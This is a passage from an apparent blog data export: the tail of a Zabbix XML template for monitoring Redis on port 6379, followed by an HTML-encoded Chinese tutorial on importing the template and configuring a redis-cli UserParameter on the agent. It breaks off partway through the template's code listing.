<snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Evicted_keys_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,evicted_keys]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Expired keys_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,expired_keys]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Last save time_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,last_save_time]</key>\n                    <delay>60</delay>\n                    <history>3</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units>unixtime</units>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>port status_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>net.tcp.listen[6379]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Request rate_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,total_commands_processed]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>1</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Role_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,role]</key>\n                    <delay>60</delay>\n                    <history>3</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>1</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Uptime in seconds_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,uptime_in_seconds]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units>uptime</units>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Used memory_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,used_memory:]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n                <item>\n                    <name>Used_memory_rss_6379</name>\n                    <type>0</type>\n                    <snmp_community/>\n                    <multiplier>0</multiplier>\n                    <snmp_oid/>\n                    <key>redis_stats[6379,used_memory_rss]</key>\n                    <delay>60</delay>\n                    <history>7</history>\n                    <trends>365</trends>\n                    <status>0</status>\n                    <value_type>3</value_type>\n                    <allowed_hosts/>\n                    <units/>\n                    <delta>0</delta>\n                    <snmpv3_securityname/>\n                    <snmpv3_securitylevel>0</snmpv3_securitylevel>\n                    <snmpv3_authpassphrase/>\n                    <snmpv3_privpassphrase/>\n                    <formula>1</formula>\n                    <delay_flex/>\n                    <params/>\n                    <ipmi_sensor/>\n                    <data_type>0</data_type>\n                    <authtype>0</authtype>\n                    <username/>\n                    <password/>\n                    <publickey/>\n                    <privatekey/>\n                    <port/>\n                    <description/>\n                    <inventory_link>0</inventory_link>\n                    <applications>\n                        <application>\n                            <name>Redis_6379</name>\n                        </application>\n                    </applications>\n                    <valuemap/>\n                </item>\n            </items>\n            <discovery_rules/>\n            <macros/>\n            <templates/>\n            <screens/>\n        </template>\n    </templates>\n    <triggers>\n        <trigger>\n            <expression>{Templates Redis_6379:net.tcp.listen[6379].count(#3,0,&quot;eq&quot;)}=3</expression>\n            <name>Redis port 6379 is not running</name>\n            <url/>\n            <status>0</status>\n            <priority>4</priority>\n            <description/>\n            <type>0</type>\n            <dependencies/>\n        </trigger>\n    </triggers>\n    <graphs>\n        <graph>\n            <name>Redis key_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,evicted_keys]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C800</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,expired_keys]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Last_save_time_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,last_save_time]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Port Connections_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>0</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>EE0000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,blocked_clients]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>BBBB00</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,total_connections_received]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>2</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>CC00CC</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,total_commands_processed]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>3</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00CCCC</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,connected_slave]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>4</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>009900</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>4</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,connected_clients]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Port status_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>net.tcp.listen[6379]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Uptime_in_seconds_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,uptime_in_seconds]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n        <graph>\n            <name>Redis Used memory_6379</name>\n            <width>900</width>\n            <height>200</height>\n            <yaxismin>0.0000</yaxismin>\n            <yaxismax>100.0000</yaxismax>\n            <show_work_period>1</show_work_period>\n            <show_triggers>1</show_triggers>\n            <type>0</type>\n            <show_legend>1</show_legend>\n            <show_3d>0</show_3d>\n            <percent_left>0.0000</percent_left>\n            <percent_right>0.0000</percent_right>\n            <ymin_type_1>0</ymin_type_1>\n            <ymax_type_1>0</ymax_type_1>\n            <ymin_item_1>0</ymin_item_1>\n            <ymax_item_1>0</ymax_item_1>\n            <graph_items>\n                <graph_item>\n                    <sortorder>0</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>C80000</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,used_memory:]</key>\n                    </item>\n                </graph_item>\n                <graph_item>\n                    <sortorder>1</sortorder>\n                    <drawtype>0</drawtype>\n                    <color>00C8C8</color>\n                    <yaxisside>0</yaxisside>\n                    <calc_fnc>2</calc_fnc>\n                    <type>0</type>\n                    <item>\n                        <host>Templates Redis_6379</host>\n                        <key>redis_stats[6379,used_memory_rss]</key>\n                    </item>\n                </graph_item>\n            </graph_items>\n        </graph>\n    </graphs>\n</zabbix_export>\n```","slug":"zabbix监控redis","published":1,"updated":"2016-11-18T01:17:04.159Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruld9003kgwtmd8hepbv0","content":"<h3 id=\"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\"><a href=\"#&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;\"></a>&#x5BFC;&#x5165;&#x76D1;&#x63A7;&#x6A21;&#x677F;</h3><p>&#x70B9;&#x51FB;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;templates&#x3011;&#x2014;&#x2014;&gt;&#x3010;import&#x3011;&#xFF0C;&#x5BFC;&#x5165;xml&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002;</p>\n<h3 id=\"&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\"><a href=\"#&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\" class=\"headerlink\" title=\"&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key\"></a>&#x914D;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;key</h3><p>&#x5728;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x65B0;&#x5EFA;/etc/zabbix/zabbix_agentd.d/userparameter_redis.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x6700;&#x540E;&#x4E00;&#x884C;&#x52A0;&#x5165;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserParameter=redis_stats[*],redis-cli -h 127.0.0.1 -p <span class=\"variable\">$1</span> info|grep <span class=\"variable\">$2</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span>2</span><br></pre></td></tr></table></figure></p>\n<p>&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5E94;&#x7528;&#x6700;&#x65B0;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#&#x6CE8;&#x610F;&#x786E;&#x8BA4;zabbix_agentd.conf&#x6587;&#x4EF6;UnsafeUserParameters=1 </span></span><br><span class=\"line\">service zabbix-agent restart</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\"><a href=\"#&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\" class=\"headerlink\" title=\"&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;\"></a>&#x670D;&#x52A1;&#x7AEF;&#x9A8C;&#x8BC1;</h3><p>&#x5728;zabbix&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x901A;&#x8FC7;zabbix_get&#x7A0B;&#x5E8F;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x80FD;&#x6B63;&#x5E38;&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF0C;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x6B63;&#x5E38;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zabbix_get <span class=\"_\">-s</span> 172.20.0.20 -k redis_stats[6379,total_connections_received]</span><br><span class=\"line\">2249669</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h3 id=\"&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\"><a href=\"#&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;\"></a>&#x6DFB;&#x52A0;&#x4E3B;&#x673A;&#x5173;&#x8054;&#x6A21;&#x677F;</h3><p>&#x901A;&#x8FC7;&#x3010;configuration&#x3011;&#x2014;&#x2014;&gt;&#x3010;hosts&#x3011;&#x2014;&#x2014;&gt;&#x3010;create host&#x3011;&#x521B;&#x5EFA;&#x65B0;&#x4E3B;&#x673A;&#xFF0C;&#x5E76;&#x5728;templates&#x9879;&#x4E2D;&#xFF0C;&#x67E5;&#x627E;Templates Redis_6379&#x6A21;&#x677F;&#xFF0C;&#x5E76;link&#x8BE5;&#x6A21;&#x677F;&#x3002;</p>\n<p>&#x9A8C;&#x8BC1;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x3010;monitoring&#x3011;&#x2014;&#x2014;&gt;&#x3010;lastest data&#x3011;&#xFF0C;&#x6253;&#x5F00;&#x521A;&#x521A;&#x6DFB;&#x52A0;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x6570;&#x636E;&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\"><a href=\"#redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\" class=\"headerlink\" title=\"redis&#x76D1;&#x63A7;&#x6A21;&#x677F;\"></a>redis&#x76D1;&#x63A7;&#x6A21;&#x677F;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span 